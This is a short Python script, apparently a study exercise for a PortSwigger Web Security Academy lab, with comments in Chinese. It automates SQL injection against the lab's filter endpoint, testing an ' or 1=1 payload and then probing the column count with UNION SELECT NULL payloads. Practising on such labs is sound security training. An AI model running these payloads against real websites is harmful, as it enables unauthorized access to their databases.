# 第2階段可偵測union欄位
import requests
from typing import Optional, Any

BASE_URL="https://0ace00f50454eab380361caa00c80090.web-security-academy.net/filter"

"""
這邊發現Session()的S要大寫
雖然session的方法點進去也是直接呼叫Session()
但AI表示大寫比較常見, 官方好像也都用大寫
"""
session = requests.Session()

def send_get_request(url:str, params: dict[str,Any], timeout:int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, params=params, timeout=timeout)
    except requests.RequestException as e:
        print(f"error:{e}")
        return None;

def test_payload(payload:str) ->bool:
    response = send_get_request(BASE_URL, {"category": payload})
    if response and response.status_code == 200:
        return True
    else:
        return False

def find_columns(max_columns:int = 20) -> Optional[int]:
    for num in range(1, max_columns+1):
        payload=f"' union select {",".join(["NULL"] * num)} from dual -- " 
        if test_payload(payload):
            print(f"column payload:{payload}")
            return num;
    return None;

def main():
    # 嘗試訪問url
    payload = "Gifts"
    if test_payload(payload):
        print(f"connect sucess:{payload}")
    else:
        return
   
    # 確認該url能sqli
    payload = "Gifts' or 1=1 -- "
    if test_payload(payload):
        print(f"sqli sucess:{payload}")
    else:
        return
    
    max_columns = find_columns()
    if not max_columns:
        return


if __name__ == "__main__":
    main()